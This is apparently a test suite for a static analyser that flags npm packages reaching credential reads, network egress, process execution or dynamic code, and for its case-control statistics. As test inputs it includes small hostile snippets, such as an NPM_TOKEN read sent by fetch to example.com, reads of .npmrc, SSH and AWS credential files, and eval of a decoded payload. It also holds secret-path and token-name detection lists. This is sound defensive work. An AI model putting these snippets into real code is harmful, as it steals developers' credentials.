/**
 * FASE A3 — the four capabilities, and the ambient uses the module graph has no
 * door for.
 *
 * Written the same way A1/A2's tests were and for the same reason: hand-written
 * cases, one per mechanic, NOT the corpus. The corpus is what A5 scores these
 * against, and a definition fitted to it first and scored against it afterwards
 * measures nothing. Every case here is a program somebody could have written,
 * chosen for the pattern it states.
 *
 * The invariant these exist to hold is the three-valued answer. `not-reached`
 * has to mean the analysis completed and found nothing, and any test that lets a
 * blinded package come back `not-reached` has caught the failure this whole
 * phase is built to avoid: the malicious package looking clean because it was
 * better hidden.
 */

import { describe, it, expect } from 'vitest'
import { analyzeModuleSource, analyzePackage, type PackageReachability } from '../src/reachability.js'
import {
  capabilitiesOf, answerFor, blindsFor, isSecretPath, isTokenEnvName, joinedPaths, moduleKey, isBuiltin,
  CAPABILITIES, capabilityDefinitions, capabilityCaveats,
  type Answer, type Capability,
} from '../src/capabilities.js'
import {
  matchOnSize, atUnit, smallestDetectableEffect, summariseGroup, compareAt, verdictFor,
  publisherOf, isTrustedPublisherIdentity, worstRatioOver, publishersNeededFor, OPACITY_ENDPOINTS,
  INSPIRED_THE_CLASS, MATCH_RATIO, SIZE_CALIPER_LOG10, EQUIVALENCE_MARGIN, UNITS, PRIMARY_UNIT,
  PREVIOUS_PRIMARY_UNIT,
  type CohortMember, type MeasuredMember,
} from '../src/capability-control.js'
import { zForFamily } from '../src/stats.js'
import { AUTHORED_OPACITY } from '../src/import-opacity.js'
import { operatorOf, linkFor, collapse, KNOWN_OPERATORS } from '../src/operator.js'

// One file, analysed as a package with that file as its entry point. Everything
// below is a statement about a package, because a capability is.
function reach(source: string, extra: Record<string, string> = {}): PackageReachability {
  const files = new Map<string, string>([['package/index.js', source]])
  for (const [name, code] of Object.entries(extra)) files.set(`package/${name}`, code)
  return analyzePackage({ files, packageJson: { main: 'index.js' }, root: 'package' })
}

function answers(source: string, extra: Record<string, string> = {}): Record<Capability, Answer> {
  const result = capabilitiesOf({ reachability: reach(source, extra) })
  return Object.fromEntries(
    CAPABILITIES.map(c => [c, answerFor(result, c)])
  ) as Record<Capability, Answer>
}

const ambient = (src: string) =>
  analyzeModuleSource(src).ambient.map(a => `${a.what}:${a.name ?? '?'}`).sort()

// ---------------------------------------------------------------------------
// The ambient bindings: no gate, and therefore no origin
// ---------------------------------------------------------------------------

describe('ambient uses are recorded apart from the module list', () => {
  it('process.env with a readable variable name', () => {
    expect(ambient(`const t = process.env.NPM_TOKEN`)).toEqual(['process.env:NPM_TOKEN'])
  })

  it('destructuring names every variable it takes', () => {
    expect(ambient(`const { NPM_TOKEN, HOME } = process.env`))
      .toEqual(['process.env:HOME', 'process.env:NPM_TOKEN'])
  })

  it('a rest element takes every variable and names none, so it records none', () => {
    expect(ambient(`const { ...all } = process.env`)).toEqual(['process.env:?'])
  })

  it('a key decided at runtime is process.env reached with no name, not process.env absent', () => {
    expect(ambient(`const v = process.env[pick()]`)).toEqual(['process.env:?'])
  })

  it('binding process.env to a name records the reach without the variable', () => {
    expect(ambient(`const e = process.env; use(e)`)).toEqual(['process.env:?'])
  })

  it('a local named process is not the process', () => {
    expect(ambient(`const process = { env: { NPM_TOKEN: 1 } }; const t = process.env.NPM_TOKEN`))
      .toEqual([])
  })

  it('fetch is recorded when it is the global and not when it is shadowed', () => {
    expect(ambient(`fetch('https://example.com')`)).toEqual(['fetch:?'])
    expect(ambient(`globalThis.fetch('https://example.com')`)).toEqual(['fetch:?'])
    expect(ambient(`const fetch = require('node-fetch'); fetch('https://example.com')`)).toEqual([])
  })

  it('eval and Function are recorded even when the body is a literal the parser can read', () => {
    // The case that used to leave no trace: the body IS readable, so nothing was
    // lost, so nothing said code had been compiled at all.
    expect(ambient(`Function('return 1')`)).toEqual(['Function:?'])
    expect(ambient(`new Function('return 1')`)).toEqual(['Function:?'])
    expect(ambient(`eval('1 + 1')`)).toEqual(['eval:?'])
  })

  it('the module list is untouched by any of them', () => {
    const result = analyzeModuleSource(`
      const t = process.env.NPM_TOKEN
      fetch('https://example.com/' + t)
      eval('1')
    `)
    expect(result.origins).toEqual([])
  })
})

// ---------------------------------------------------------------------------
// Call arguments
// ---------------------------------------------------------------------------

describe('static strings that reached a call on a followed value', () => {
  const argsOf = (src: string) =>
    analyzeModuleSource(src).callArguments.map(a => `${a.module}.${a.memberPath.join('.')}[${a.index}]=${a.value ?? 'unread'}`)

  it('a literal handed to a filesystem call is recorded with the call it reached', () => {
    expect(argsOf(`const fs = require('fs'); fs.readFileSync('/home/u/.npmrc')`))
      .toContain('fs.readFileSync[0]=/home/u/.npmrc')
  })

  it('an argument that does not fold is recorded as unread, never dropped', () => {
    expect(argsOf(`const fs = require('fs'); fs.readFileSync(target)`))
      .toContain('fs.readFileSync[0]=unread')
  })

  it('a literal in a file nothing calls is not a call argument', () => {
    expect(argsOf(`const p = '/home/u/.npmrc'`)).toEqual([])
  })

  it('the argument index is kept, so a joined path can be put back together', () => {
    const joined = joinedPaths(
      analyzeModuleSource(`
        const path = require('path'), os = require('os')
        path.join(os.homedir(), '.aws', 'credentials')
      `).callArguments
    )
    expect(joined).toContain('.aws/credentials')
  })

  it('two joins on different lines do not merge into one path', () => {
    const joined = joinedPaths(
      analyzeModuleSource(`
        const path = require('path')
        path.join(home, '.aws', 'credentials')
        path.join(home, '.aws', 'config')
      `).callArguments
    )
    expect(joined.sort()).toEqual(['.aws/config', '.aws/credentials'])
  })
})

// ---------------------------------------------------------------------------
// The four
// ---------------------------------------------------------------------------

describe('the four capabilities, when the analysis completes', () => {
  it('reaching child_process is external_exec, through every rename', () => {
    expect(answers(`const cp = require('child_process'); cp.spawn('sh')`).external_exec).toBe('reached')
    expect(answers(`const { execFile: e } = require('node:child_process'); e('sh')`).external_exec).toBe('reached')
    expect(answers(`const m = require('child' + '_process')`).external_exec).toBe('reached')
  })

  it('the four network modules and the global fetch are network_egress', () => {
    for (const module of ['net', 'http', 'https', 'dgram']) {
      expect(answers(`require('${module}')`).network_egress, module).toBe('reached')
    }
    expect(answers(`fetch('https://example.com')`).network_egress).toBe('reached')
  })

  it('vm, eval, Function and a computed specifier are dynamic_code', () => {
    expect(answers(`require('vm')`).dynamic_code).toBe('reached')
    expect(answers(`eval(build())`).dynamic_code).toBe('reached')
    expect(answers(`Function('return 1')()`).dynamic_code).toBe('reached')
    expect(answers(`require(name)`).dynamic_code).toBe('reached')
  })

  it('reaching fs is NOT credential_read on its own', () => {
    // Nearly every package on npm reaches fs. If that were the capability the
    // rate would be a measurement of npm.
    expect(answers(`const fs = require('fs'); fs.readFileSync('./package.json', 'utf8')`).credential_read)
      .toBe('not-reached')
  })

  it('a secret path that reached a filesystem call is credential_read', () => {
    expect(answers(`const fs = require('fs'); fs.readFileSync('/home/u/.npmrc', 'utf8')`).credential_read)
      .toBe('reached')
  })

  it('a token-shaped environment variable is credential_read with no filesystem at all', () => {
    expect(answers(`const t = process.env.GITHUB_TOKEN`).credential_read).toBe('reached')
    expect(answers(`const h = process.env.HOME`).credential_read).toBe('not-reached')
  })

  it('a package that reaches nothing reaches nothing', () => {
    const all = answers(`module.exports = a => a + 1`)
    expect(Object.values(all)).toEqual(['not-reached', 'not-reached', 'not-reached', 'not-reached'])
  })
})

// ---------------------------------------------------------------------------
// The invariant
// ---------------------------------------------------------------------------

describe('a trail nobody could follow is never a negative answer', () => {
  it('a specifier decided at runtime blinds the module capabilities and IS dynamic_code', () => {
    const a = answers(`const m = require(pick())`)
    expect(a.dynamic_code).toBe('reached')
    expect(a.network_egress).toBe('indeterminate')
    expect(a.external_exec).toBe('indeterminate')
    expect(a.credential_read).toBe('indeterminate')
  })

  it('an eval over a body built at runtime blinds the other three', () => {
    const a = answers(`eval(atob(payload))`)
    expect(a.dynamic_code).toBe('reached')
    expect(a.external_exec).toBe('indeterminate')
  })

  it('a relative specifier that resolves to no file in the package blinds everything', () => {
    // The staged payload: index.js requires ./_perf.js and the tarball does not
    // ship it. The code that runs is not the code that was read.
    const a = answers(`try { require('./_perf.js') } catch (e) {}`)
    expect(new Set(Object.values(a))).toEqual(new Set(['indeterminate']))
  })

  it('an executable no parser reads blinds everything, whatever the JavaScript says', () => {
    const result = capabilitiesOf({
      reachability: reach(`module.exports = 1`),
      opaqueExecutable: true,
    })
    for (const capability of CAPABILITIES) {
      expect(answerFor(result, capability), capability).toBe('indeterminate')
    }
  })

  it('a package too large to follow is indeterminate, not clean', () => {
    const result = capabilitiesOf({
      reachability: reach(`module.exports = 1`),
      analysisRefused: true,
    })
    expect(answerFor(result, 'external_exec')).toBe('indeterminate')
  })

  it('found beats blinded: a capability reached is reached however lost the rest is', () => {
    const a = answers(`require('child_process'); eval(build()); require(pick())`)
    expect(a.external_exec).toBe('reached')
    expect(a.dynamic_code).toBe('reached')
  })

  it('a computed member blinds only the answer that needs a member', () => {
    const a = answers(`const fs = require('fs'); fs[pick()]('/tmp/x')`)
    expect(a.credential_read).toBe('indeterminate')
    expect(a.network_egress).toBe('not-reached')
  })

  it('a filesystem call handed a variable cannot come back "no secret was read"', () => {
    const a = answers(`const fs = require('fs'); fs.readFileSync(wherever)`)
    expect(a.credential_read).toBe('indeterminate')
  })

  it('process.env reached with no readable name blinds credential_read', () => {
    expect(answers(`const e = process.env; ship(e)`).credential_read).toBe('indeterminate')
  })
})

// ---------------------------------------------------------------------------
// Dependencies, and the difference from grep
// ---------------------------------------------------------------------------

describe('what the package itself reaches, and what it hands off', () => {
  it('a dependency reached is reported apart, not folded into an answer', () => {
    const result = capabilitiesOf({ reachability: reach(`require('some-dependency')`) })
    expect(result.externalModules).toEqual(['some-dependency'])
    expect(answerFor(result, 'external_exec')).toBe('not-reached')
  })

  it('builtins are not dependencies', () => {
    const result = capabilitiesOf({ reachability: reach(`require('node:fs'); require('path')`) })
    expect(result.externalModules).toEqual([])
  })

  it('a secret path that never reaches a call is counted, and does not decide anything', () => {
    const source = `const NOTE = '/home/u/.npmrc'; module.exports = 1`
    const result = capabilitiesOf({
      reachability: reach(source),
      sources: new Map([['package/index.js', source]]),
    })
    expect(result.secretPathGrepOnly).toBe(1)
    expect(answerFor(result, 'credential_read')).toBe('not-reached')
  })

  it('the post-hoc definition is off unless it is asked for', () => {
    const source = `
      const fs = require('fs'), path = require('path'), os = require('os')
      fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'))
    `
    const frozen = capabilitiesOf({ reachability: reach(source) })
    const repaired = capabilitiesOf({ reachability: reach(source), joinPathSegments: true })
    expect(answerFor(frozen, 'credential_read')).toBe('indeterminate')
    expect(answerFor(repaired, 'credential_read')).toBe('reached')
  })
})

// ---------------------------------------------------------------------------
// The lists
// ---------------------------------------------------------------------------

describe('the two lists, which are the only lists', () => {
  it('secret paths match on the file, not on a word that starts the same way', () => {
    expect(isSecretPath('/home/u/.npmrc')).toBe(true)
    expect(isSecretPath('/home/u/.ssh/id_rsa')).toBe(true)
    expect(isSecretPath('.env')).toBe(true)
    expect(isSecretPath('/app/.env.production')).toBe(true)
    expect(isSecretPath('src/environment.js')).toBe(false)
    expect(isSecretPath('./package.json')).toBe(false)
  })

  it('token env names match on shape, and ordinary variables do not', () => {
    expect(isTokenEnvName('NPM_TOKEN')).toBe(true)
    expect(isTokenEnvName('aws_secret_access_key')).toBe(true)
    expect(isTokenEnvName('GOOGLE_APPLICATION_CREDENTIALS')).toBe(true)
    expect(isTokenEnvName('HOME')).toBe(false)
    expect(isTokenEnvName('NODE_ENV')).toBe(false)
  })

  it('module keys fold node: and subpaths, and keep a scope whole', () => {
    expect(moduleKey('node:fs')).toBe('fs')
    expect(moduleKey('fs/promises')).toBe('fs')
    expect(moduleKey('@scope/pkg/sub')).toBe('@scope/pkg')
    expect(isBuiltin('node:child_process')).toBe(true)
    expect(isBuiltin('express')).toBe(false)
  })

  it('the definitions and the caveats travel with the answer', () => {
    expect(capabilityDefinitions().map(d => d.capability).sort()).toEqual([...CAPABILITIES].sort())
    expect(capabilityCaveats().length).toBeGreaterThan(0)
  })
})

// ---------------------------------------------------------------------------
// A5's machinery
// ---------------------------------------------------------------------------

const member = (name: string, bytes: number, at: string, publisher: string | null): CohortMember => ({
  package: name, version: '1.0.0', capturedAt: at, ngpackPath: `/x/${name}`,
  unpackedSize: bytes, publisher, captureReason: 'quarantine-no-genome', label: 'unconfirmed',
})

describe('the control is matched on size, and cannot borrow a member twice', () => {
  const pool = [
    member('a', 1000, '2026-08-15T00:00:00Z', 'p1'),
    member('b', 1100, '2026-08-15T01:00:00Z', 'p2'),
    member('c', 1200, '2026-08-15T02:00:00Z', 'p3'),
    member('d', 900_000, '2026-08-15T03:00:00Z', 'p4'),
  ]

  it('draws the nearest by size within the caliper', () => {
    const [match] = matchOnSize([member('case', 1050, '2026-08-15T00:00:00Z', 'x')], pool, 2)
    expect(match!.controls.map(c => c.package)).toEqual(['b', 'a'])
  })

  it('never draws a control outside the caliper, and says how short it came', () => {
    const [match] = matchOnSize([member('case', 900_000, '2026-08-15T00:00:00Z', 'x')], pool, 3)
    expect(match!.controls.map(c => c.package)).toEqual(['d'])
    expect(match!.shortfall).toBe(2)
  })

  it('does not give the same control to two cases', () => {
    const matches = matchOnSize(
      [member('c1', 1000, '2026-08-15T00:00:00Z', 'x'), member('c2', 1050, '2026-08-15T00:00:00Z', 'y')],
      pool, 2
    )
    const drawn = matches.flatMap(m => m.controls.map(c => c.package))
    expect(new Set(drawn).size).toBe(drawn.length)
  })

  it('is deterministic: the same inputs draw the same controls', () => {
    const once = matchOnSize([member('case', 1050, '2026-08-15T00:00:00Z', 'x')], pool, 2)
    const twice = matchOnSize([member('case', 1050, '2026-08-15T00:00:00Z', 'x')], pool, 2)
    expect(once[0]!.controls.map(c => c.package)).toEqual(twice[0]!.controls.map(c => c.package))
  })
})

describe('the unit of analysis is chosen, not inherited from the directory count', () => {
  const measured = (name: string, at: string, publisher: string): MeasuredMember => ({
    member: member(name, 1000, at, publisher),
    scan: { capabilities: { answers: [], externalModules: [], secretPathGrepOnly: 0, secretPathsReached: [], tokenEnvRead: [], namelessEnvRead: false }, reachability: null, refusal: null, parseableFiles: 0, sourceBytes: 0, opaqueExecutable: false, opaqueKinds: [] },
    answers: { credential_read: 'not-reached', network_egress: 'not-reached', external_exec: 'not-reached', dynamic_code: 'not-reached' },
    repaired: { credential_read: 'not-reached', network_egress: 'not-reached', external_exec: 'not-reached', dynamic_code: 'not-reached' },
    strict: { credential_read: 'not-reached', network_egress: 'not-reached', external_exec: 'not-reached', dynamic_code: 'not-reached' },
    profile: null,
  })

  const members = [
    measured('yorn', '2026-08-15T01:00:00Z', 'siwatfa'),
    measured('yorn', '2026-08-15T02:00:00Z', 'siwatfa'),
    measured('yorn', '2026-08-15T03:00:00Z', 'siwatfa'),
    measured('kit', '2026-08-15T04:00:00Z', 'a_soclav'),
    measured('svelte', '2026-08-15T05:00:00Z', 'a_soclav'),
  ]

  it('five captures are three packages and two accounts', () => {
    expect(atUnit(members, 'capture')).toHaveLength(5)
    expect(atUnit(members, 'package')).toHaveLength(3)
    expect(atUnit(members, 'publisher')).toHaveLength(2)
  })

  it('the earliest capture represents its unit, so republishing cannot pick the representative', () => {
    expect(atUnit(members, 'publisher').map(m => m.member.capturedAt))
      .toEqual(['2026-08-15T01:00:00Z', '2026-08-15T04:00:00Z'])
  })

  it('the primary unit is the one with the fewest assumptions in it', () => {
    // Was `publisher` until 2026-08-21, on the reasoning that an account is an
    // independent decision. The corpus refuted it: ferrousdev, wokorc and
    // corssdev share a package.json field order no other publisher in 10,192
    // names uses, and ran the same two-tier dependency structure four times in
    // 28.6 hours. A5 had been counting the first two as two independent events.
    expect(PRIMARY_UNIT).toBe('operator')
    expect(PREVIOUS_PRIMARY_UNIT).toBe('publisher')
    expect(UNITS).toContain('capture')
    // Kept in the output, not replaced: every run before that date reported the
    // publisher unit and a reader comparing against them needs the same number.
    expect(UNITS).toContain('publisher')
  })

  it('the operator unit is never coarser than the publisher unit by accident', () => {
    // An account with no declared link is its own operator, so the two units can
    // only differ where a merge has been written down with its evidence.
    expect(operatorOf('nobody-has-linked-this-account')).toBe('nobody-has-linked-this-account')
    expect(operatorOf('ferrousdev')).toBe(operatorOf('wokorc'))
    expect(operatorOf('ferrousdev')).toBe(operatorOf('corssdev'))
    expect(operatorOf(null)).toBeNull()
  })

  it('every declared link carries the evidence that establishes it', () => {
    // A merge that turns out to be wrong costs a degree of freedom the analysis
    // cannot get back, so a link with no stated reason must not be addable.
    for (const link of KNOWN_OPERATORS) {
      expect(link.accounts.length).toBeGreaterThan(1)
      expect(link.evidence.length).toBeGreaterThan(0)
      expect(link.because.length).toBeGreaterThan(120)
      for (const account of link.accounts) {
        expect(linkFor(account)).toBe(link)
      }
    }
  })

  it('collapses the accounts it links and leaves the rest alone', () => {
    const c = collapse(['ferrousdev', 'wokorc', 'corssdev', 'siwatfa', 'whltd4', null])
    expect(c.accounts).toBe(5)
    expect(c.operators).toBe(3)
    expect(c.merged).toHaveLength(1)
    expect(c.merged[0]!.accounts).toEqual(['corssdev', 'ferrousdev', 'wokorc'])
  })

  // Adding an endpoint without widening the correction is how "we tried nine
  // things and one separated" comes to read as a finding. The constant is
  // declared beside the other pre-run constants; this is what stops it drifting
  // from the number of intervals the run actually prints.
  it('the opacity endpoints are declared, and the family is widened by exactly them', () => {
    // 5 binary measures (any authored opacity + the four authored kinds) and
    // 4 strict-capability comparisons, all at the primary unit only.
    expect(OPACITY_ENDPOINTS).toBe(AUTHORED_OPACITY.length + 1 + CAPABILITIES.length)
    // And the widened family is strictly more conservative than the old one.
    expect(zForFamily(UNITS.length * CAPABILITIES.length + OPACITY_ENDPOINTS))
      .toBeGreaterThan(zForFamily(UNITS.length * CAPABILITIES.length))
  })

  // The defect this pins: `atUnit` unioned the ANSWERS at the `-any` units and
  // kept the earliest capture's scan, so every scan-derived counter in
  // summariseGroup described one capture at a unit whose contract is "ever, in
  // the window". It undercounted opacity on the run of 2026-08-21 — three case
  // packages ship an opaque executable, from three accounts, and publisher-any
  // printed two, because rihannasmith's earliest capture is the readable one.
  describe('the -any fold reaches the scan, not only the answers', () => {
    const withScan = (
      name: string, at: string, publisher: string,
      scan: Partial<MeasuredMember['scan']>
    ): MeasuredMember => {
      const base = measured(name, at, publisher)
      return { ...base, scan: { ...base.scan, ...scan } }
    }

    const opaqueLater = [
      withScan('readable', '2026-08-15T01:00:00Z', 'rihannasmith', {}),
      withScan('minified', '2026-08-15T02:00:00Z', 'rihannasmith', {
        opaqueExecutable: true, opaqueKinds: ['minified'],
      }),
    ]

    it('opacity is a demonstration: any capture of the unit carries it', () => {
      expect(atUnit(opaqueLater, 'publisher')[0]!.scan.opaqueExecutable).toBe(false)
      expect(atUnit(opaqueLater, 'publisher-any')[0]!.scan.opaqueExecutable).toBe(true)
      expect(atUnit(opaqueLater, 'publisher-any')[0]!.scan.opaqueKinds).toContain('minified')
    })

    it('never opened is a failure to look: it takes EVERY capture, not any', () => {
      const oneRefused = [
        withScan('refused', '2026-08-15T01:00:00Z', 'acct', { refusal: 'no JavaScript in the archive' }),
        withScan('read', '2026-08-15T02:00:00Z', 'acct', { refusal: null }),
      ]
      expect(atUnit(oneRefused, 'publisher')[0]!.scan.refusal).not.toBeNull()
      expect(atUnit(oneRefused, 'publisher-any')[0]!.scan.refusal).toBeNull()

      const allRefused = [
        withScan('a', '2026-08-15T01:00:00Z', 'acct', { refusal: 'no JavaScript in the archive' }),
        withScan('b', '2026-08-15T02:00:00Z', 'acct', { refusal: 'past the size bound' }),
      ]
      expect(atUnit(allRefused, 'publisher-any')[0]!.scan.refusal).not.toBeNull()
    })

    it('the two halves of credential_read union, so evidence is not lost to ordering', () => {
      const evidence = [
        withScan('first', '2026-08-15T01:00:00Z', 'acct', {}),
        withScan('second', '2026-08-15T02:00:00Z', 'acct', {
          capabilities: {
            answers: [], externalModules: ['axios'], secretPathGrepOnly: 0,
            secretPathsReached: ['.npmrc'], tokenEnvRead: ['NPM_TOKEN'], namelessEnvRead: false,
          },
        }),
      ]
      const folded = atUnit(evidence, 'publisher-any')[0]!.scan.capabilities
      expect(folded.secretPathsReached).toEqual(['.npmrc'])
      expect(folded.tokenEnvRead).toEqual(['NPM_TOKEN'])
      expect(folded.externalModules).toEqual(['axios'])
    })

    it('leaves the earliest-capture units alone: the primary unit did not change', () => {
      expect(atUnit(opaqueLater, 'publisher')[0]!.member.capturedAt).toBe('2026-08-15T01:00:00Z')
      expect(atUnit(opaqueLater, 'package').map(m => m.member.package)).toEqual(['readable', 'minified'])
    })
  })
})

describe('what the run could have found is computed before what it did', () => {
  it('names the largest control rate that would still separate', () => {
    const power = smallestDetectableEffect(6, 60, zForFamily(12))
    expect(power.maxControlsReaching).toBeGreaterThanOrEqual(0)
    expect(power.statement).toMatch(/most this run can find|NOTHING IS DETECTABLE/)
  })

  it('says so plainly when nothing at all is detectable', () => {
    const power = smallestDetectableEffect(1, 2, zForFamily(12))
    expect(power.statement).toContain('NOTHING IS DETECTABLE HERE')
  })

  // The requirement `corpus --publishers` prints. It is the number that decides
  // when A5 is worth re-running, so the direction of every term is pinned here:
  // getting it backwards would make the study look reachable when it is not.
  describe('the publishers a difference would need', () => {
    const z = zForFamily(20)

    it('a case arm that answers half the time needs more accounts than one that always answers', () => {
      const always = publishersNeededFor({ controlRate: 0.16, nControls: 125, z, determinateShare: 1 })
      const half = publishersNeededFor({ controlRate: 0.16, nControls: 125, z, determinateShare: 0.5 })
      expect(always).not.toBeNull()
      expect(half).not.toBeNull()
      expect(half!).toBeGreaterThan(always!)
    })

    it('a commoner control rate needs more accounts, because the gap is harder to see', () => {
      const rare = publishersNeededFor({ controlRate: 0.06, nControls: 125, z, determinateShare: 1 })
      const common = publishersNeededFor({ controlRate: 0.33, nControls: 125, z, determinateShare: 1 })
      expect(common!).toBeGreaterThan(rare!)
    })

    it('a case arm that never answers has no requirement, not a small one', () => {
      expect(publishersNeededFor({ controlRate: 0.16, nControls: 125, z, determinateShare: 0 })).toBeNull()
    })

    it('the margin is the effect being asked about: a smaller one costs more accounts', () => {
      const wide = publishersNeededFor({ controlRate: 0.16, nControls: 125, z, determinateShare: 1, margin: 0.30 })
      const narrow = publishersNeededFor({ controlRate: 0.16, nControls: 125, z, determinateShare: 1, margin: 0.10 })
      expect(narrow === null || narrow > wide!).toBe(true)
    })
  })

  it('a comparison with an empty denominator is not calculable, not zero', () => {
    const empty = summariseGroup({ name: 'x', unit: 'publisher', members: [], failures: [] })
    const comparison = compareAt(empty, empty, 1.96)
    expect(comparison[0]!.verdict).toContain('Not calculable')
  })

  it('the verdict names the bound whenever the case side has an indeterminate in it', () => {
    const text = verdictFor(
      'network_egress',
      { capability: 'network_egress', reached: 2, notReached: 0, indeterminate: 4, overDeterminate: { successes: 2, n: 2, rate: 1, low: 0.3, high: 1 }, atLeast: 2 / 6, atMost: 1 },
      { capability: 'network_egress', reached: 1, notReached: 59, indeterminate: 0, overDeterminate: { successes: 1, n: 60, rate: 1 / 60, low: 0, high: 0.1 }, atLeast: 1 / 60, atMost: 1 / 60 },
      { a: { successes: 2, n: 2, rate: 1, low: 0.3, high: 1 }, b: { successes: 1, n: 60, rate: 1 / 60, low: 0, high: 0.1 }, difference: 0.98, low: 0.5, high: 1, separated: true }
    )
    expect(text).toContain('4 indeterminate')
  })

  it('the design constants are the ones the header describes', () => {
    expect(MATCH_RATIO).toBe(10)
    expect(SIZE_CALIPER_LOG10).toBeCloseTo(0.3)
    expect(EQUIVALENCE_MARGIN).toBe(0.20)
    expect(INSPIRED_THE_CLASS).toContain('prezdentkxheiw')
    expect(INSPIRED_THE_CLASS).toContain('internallib_v756')
  })
})

describe('the bounds that dropped facts silently (A5 audit, v1.4.0)', () => {
  // Each per-module bound used to `return` without recording a lost point, so
  // past the bound capabilitiesOf saw neither the evidence nor a blinder and
  // answered `not-reached`. That is the exact failure the three-valued answer
  // exists to prevent, and it was one-sided in the corpus: 25 of 99 controls
  // saturated a bound and 0 of 42 cases did.
  const withFiller = (n: number, tail: string) => {
    const filler = Array.from({ length: n }, (_, i) => `path.join('a${i}', 'b${i}');`).join('\n')
    const source = `const fs = require('fs')\nconst path = require('path')\nconst cp = require('child_process')\n${filler}\n${tail}\n`
    const files = new Map([['package/index.js', source]])
    const reachability = analyzePackage({ files, packageJson: { main: 'index.js' }, root: 'package' })
    return { reachability, capabilities: capabilitiesOf({ reachability, sources: files }) }
  }
  const answer = (c: ReturnType<typeof capabilitiesOf>, capability: Capability) =>
    c.answers.find(a => a.capability === capability)!

  it('under the bound, a secret path that reached a call is still reached', () => {
    const { capabilities } = withFiller(100, `fs.readFileSync('/root/.npmrc')`)
    expect(answer(capabilities, 'credential_read').answer).toBe('reached')
  })

  it('past the bound the same package is indeterminate, never not-reached', () => {
    const { reachability, capabilities } = withFiller(600, `fs.readFileSync('/root/.npmrc')`)
    const credential = answer(capabilities, 'credential_read')
    expect(reachability.lost.some(l => l.reason === 'argument-bound')).toBe(true)
    expect(credential.answer).toBe('indeterminate')
    expect(credential.answer).not.toBe('not-reached')
    expect(credential.blindedBy.length).toBeGreaterThan(0)
  })

  it('argument-bound blinds credential_read alone and leaves the module answers standing', () => {
    const { capabilities } = withFiller(600, `cp.execSync('id')`)
    expect(answer(capabilities, 'credential_read').answer).toBe('indeterminate')
    // The other three are answered by which module is reached, which this bound
    // does not touch. Blinding them here would throw away sound answers.
    expect(answer(capabilities, 'external_exec').answer).toBe('reached')
    expect(answer(capabilities, 'external_exec').blindedBy).toEqual([])
    expect(answer(capabilities, 'network_egress').blindedBy).toEqual([])
    expect(answer(capabilities, 'dynamic_code').blindedBy).toEqual([])
  })

  it('every bound reason blinds by the kind of fact it stopped collecting', () => {
    expect(blindsFor('argument-bound')).toEqual(['credential_read'])
    expect(blindsFor('ambient-bound')).toEqual(['credential_read', 'network_egress', 'dynamic_code'])
    expect(blindsFor('origin-bound')).toEqual([...CAPABILITIES])
  })
})

describe('who published it, and how far the control really was (A5 audit, v1.4.0)', () => {
  // npm's OIDC trusted publishing writes the workflow into _npmUser, not the
  // account. Read literally it made eighteen control packages owned by eleven
  // accounts look like two publishers — in the PRIMARY unit — and `atUnit` keeps
  // one capture per group, so sixteen measured control packages fell out of the
  // primary analysis. The case arm publishes with tokens and never tripped it,
  // so the whole error shrank the control side alone.
  it('reads the account, not the workflow, when npm records a trusted publisher', () => {
    const maintainers = [{ name: 'matthew.duggan' }, { name: 'someone-else' }]
    expect(publisherOf(
      { name: 'GitHub Actions', email: 'npm-oidc-no-reply@github.com', trustedPublisher: { id: 'github' } },
      maintainers
    )).toBe('matthew.duggan')
  })

  it('recognises the identity by either marker, so one provider dropping the object is not a hole', () => {
    expect(isTrustedPublisherIdentity({ name: 'CircleCI', email: 'npm-oidc-no-reply@github.com' })).toBe(true)
    expect(isTrustedPublisherIdentity({ name: 'Anything', trustedPublisher: { id: 'x' } })).toBe(true)
    expect(isTrustedPublisherIdentity({ name: 'realuser', email: 'real@example.com' })).toBe(false)
    expect(isTrustedPublisherIdentity(undefined)).toBe(false)
  })

  it('a human publisher is still read straight off _npmUser', () => {
    expect(publisherOf({ name: 'siwatfa', email: 'siwatfa@example.com' }, [{ name: 'other' }])).toBe('siwatfa')
  })

  it('falls back to the first maintainer when _npmUser is missing entirely', () => {
    expect(publisherOf(undefined, [{ name: 'only-maintainer' }])).toBe('only-maintainer')
    expect(publisherOf(undefined, undefined)).toBeNull()
  })

  // The match draws ONE representative per control package and the caliper was
  // checked there; the measured set is every capture of that package in the
  // window, and v1.3.0 never re-checked it. @vanillaskyai/sdk was matched at
  // 26,605,866 B and measured at 2,289,754 B — 11.39x against a declared 1.995x
  // — inside the one arm that carried the run's only SEPARATES row.
  it('reports the widest gap over what was measured, not over what was matched', () => {
    const match = {
      case: member('case', 26_074_395, '2026-08-15T00:00:00Z', 'x'),
      controls: [member('drifted', 26_605_866, '2026-08-15T00:00:00Z', 'p1')],
      shortfall: 0,
    }
    const measured = [member('drifted', 2_289_754, '2026-08-16T00:00:00Z', 'p1')]
    expect(worstRatioOver(match, measured)).toBeCloseTo(11.39, 1)
  })

  it('falls back to the matched representatives when nothing of that package was measured', () => {
    const match = {
      case: member('case', 1000, '2026-08-15T00:00:00Z', 'x'),
      controls: [member('c', 1100, '2026-08-15T00:00:00Z', 'p1')],
      shortfall: 0,
    }
    expect(worstRatioOver(match, [])).toBeCloseTo(1.1, 5)
  })
})
